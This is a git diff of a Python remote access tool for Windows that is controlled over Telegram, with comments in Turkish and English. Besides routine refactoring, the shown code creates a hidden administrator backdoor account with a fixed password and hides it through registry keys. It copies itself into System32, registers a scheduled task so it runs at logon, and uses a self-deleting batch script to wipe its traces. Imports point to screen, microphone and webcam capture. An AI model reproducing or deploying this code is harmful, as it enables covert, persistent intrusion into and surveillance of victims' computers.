@@ -7,7 +7,7 @@
 #https://github.com/ny4rlk0/Telegram-ile-Uzaktan-Erisim-Araci-Remote-Access-Tool-with-Telegram/
 #BTC: 3NhGAPpkLas1pDdPp7tSeP5ba1gHapq7kb
 import telepot,telepot.loop,telepot.namedtuple
-import sqlite3,threading,os,time,pprint,random,validators,base64,json,subprocess
+import sqlite3,threading,os,time,random,validators,base64,json
 import configparser as c
 import subprocess as sp
 import requests as rq
@@ -15,21 +15,16 @@ from PIL import ImageGrab as sc
 import socket
 import sounddevice as sd
 from scipy.io.wavfile import write
-from shutil import copyfile
 import cv2
-import getpass
+#from shutil import copyfile
+#import getpass
+#import pprint
 
 who="z3r0tw0"
 nya=0
 rlko=0
-software_name="RemoteAccessTool.exe"
-#try:
-#    username=str(getpass.getuser())
-#except:
-#username=str(os.getlogin())
 username="rat"
 password="rat"
-#   pass
 settings_name="RemoteAccessTool.settings"
 lang="tr" #For english type en in RemoteAccessTool.settings. Türkçe için RemoteAccessTool.settings içine langue karşısına tr yazın.
 xROOT_ACCESS=95454545 #Let'secure our access to computer with Telegram user id. Bilgisayara erişimimizi telegram id'miz ile güvenceye alalım.
@@ -56,16 +51,16 @@ xdir=os.getcwd()
 softwarename=str(os.path.basename(__file__))
 
 #If you run as source code disable this code. Kaynak kod olarak çalıştıracaksanız bu kodu kaldırın.
+softwarename=softwarename.replace(".py",".exe") #Patch since it sees .py even tho its .exe ending. Yama: dosya yolunda sorgularken .exe yerine .py olarak görüyor bu yanlış release için.
+
 #print(softwarename)
-#softwarename.replace(".py",".exe") #Patch since it sees .py even tho its .exe ending. Yama: dosya yolunda sorgularken .exe yerine .py olarak görüyor bu yanlış release için.
-#print(softwarename)
-software_rundir=os.path.join(xdir,software_name)
+software_rundir=os.path.join(xdir,softwarename)
 settings_dir=os.path.join(xdir,settings_name)
-start_dir=os.path.join(system32,software_name)
+start_dir=os.path.join(system32,softwarename)
 settings_path=system32+settings_name
-software_path=system32+software_name
+software_path=system32+softwarename
 #print(software_path)
-startup_path=str(system32)+str(software_name)
+startup_path=str(system32)+str(softwarename)
 xml_name="RemoteAccessTool.xml" #XML name for schedule task in windows. Windowsta görev zamanlamak için XML dosyası adı.
 xml_path=str(system32)+str(xml_name) #Schedule tasks XML file. Görev zamanlamaya yazılacak xml dosyası.
 
@@ -128,8 +123,8 @@ except:
 def win_copy_file(source_path,target_path):
     if os.name=="nt":
         try:
-            #sp.call(['copy', source_path, target_path]) #not working
-            os.system(f"copy"+" "+source_path+" "+target_path)
+            #sp.call(['copy', f"{source_path}", f"{target_path}"]) #not working
+            os.system("copy"+" "+f"{source_path}"+" "+f"{target_path}")
         except:
             pass
 def get_sid(insert_username):
@@ -207,27 +202,32 @@ taskkill /f /im python.exe
 taskkill /f /im python.exe
 taskkill /f /im python.exe
 taskkill /f /im python.exe
-taskkill /f /im {software_name}
-taskkill /f /im {software_name}
+taskkill /f /im {softwarename}
+taskkill /f /im {softwarename}
 del /f /q {settings_path}
 del /f /q {xml_path}
 del /f /q {software_path}
 echo del /f /q {batch_file_path}>>{batch_file_path2}
-echo timeout 1>>{batch_file_path2}
+echo exit>>{batch_file_path2}
 start /b {batch_file_path2}
 exit
 """
 def win_wipe_prints(): #Wipe_prints
     if os.name=="nt":
+        chk_file(batch_file_path)
+        chk_file(batch_file_path2)
         wipe=open(batch_file_path,"w") #Open file to write. (for read use "r" for write "w") Dosyayı yazmak için açalım. (okumak için "r" yazmak için "w")
         wipe.write(str(win_delete_batch))
         wipe.close()
-        os.system(f"start /b {batch_file_bath}")
+        os.system(f"start /b {batch_file_path}")
 
 def chk_file(filepath):
-    chk= os.path.exists(filepath)
-    if chk:
-        os.remove(filepath)
+    try:
+        chk= os.path.exists(filepath)
+        if chk:
+            os.remove(filepath)
+    except:
+        pass
 tr_menu=telepot.namedtuple.ReplyKeyboardMarkup(
     keyboard=[
         [telepot.namedtuple.KeyboardButton(text="/userid"),
@@ -263,20 +263,18 @@ def add_startup():
             sid=get_sid(username)
             #print("2")
             globalMessage(sid)
-            sp.call(['net', 'user', '/delete', username])
-            sp.call(['net', 'user', '/add', username, password])  #Add backdoor user. Arka kapı kullanıcısı ekleyelim.
-            sp.call(['net', 'localgroup', 'administrators', username, '/add']) #Grant user to Admin permissions. Admin yetkisi verelim.
+            sp.call(['net', 'user', '/delete', f'{username}'])
+            sp.call(['net', 'user', '/add', f'{username}', f'{password}'])  #Add backdoor user. Arka kapı kullanıcısı ekleyelim.
+            sp.call(['net', 'localgroup', 'administrators', f'{username}', '/add']) #Grant user to Admin permissions. Admin yetkisi verelim.
             sp.call(['REG', 'ADD', 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts', '/f'])#To hide user. Kullanıcıyı gizlemek için regediti editleyelim.
             sp.call(['REG', 'ADD', 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList', '/f']) #same
-            sp.call(['REG', 'ADD', 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList', '/v', username, '/t', 'REG_DWORD', '/d', '0', '/f']) #Change "/d 0" to "/d 1" if you want account to visible. Hesabın gözükmesini istiyorsanız "/d 0" yu "/d 1" olarak değişin.
+            sp.call(['REG', 'ADD', 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList', '/v', f'{username}', '/t', 'REG_DWORD', '/d', '0', '/f']) #Change "/d 0" to "/d 1" if you want account to visible. Hesabın gözükmesini istiyorsanız "/d 0" yu "/d 1" olarak değişin.
             #print("3")
-            real_sp=system32+"RemoteAccessTool.exe"
-            #print("4")
             chk_file(xml_path)
             #print("5")
             chk_file(system32+settings_name)
             #print("6")
-            chk_file(system32+software_name)
+            chk_file(system32+softwarename)
             #print("7")
             #if not os.path.exists(xml_path):
             xmlfile=open(xml_path,"w") #Open file to write. (for read use "r" for write "w") Dosyayı yazmak için açalım. (okumak için "r" yazmak için "w")
@@ -285,18 +283,12 @@ def add_startup():
             #print("8")
             #if not os.path.exists(system32+settings_name):
             try:
-                #copyfile(settings_dir, settings_path)
                 win_copy_file(settings_dir, system32)
             except Exception as Err:
-                Error1=Err
                 pass 
-            #print("9")
-            #if not os.path.exists(system32+software_name):
             try:
-                #copyfile(software_rundir, software_path)
                 win_copy_file(software_rundir, system32)
-            except Exception as Err2:
-                Error2=Err2
+            except:
                 pass
             #print("10") 
             out7=sp.call(['schtasks.exe', '/create', '/tn', startup_taskname, '/XML', xml_path, '/ru', Author, '/rp', password]) #Add our Sofware to login. Programımızı başlangıça atayalım.
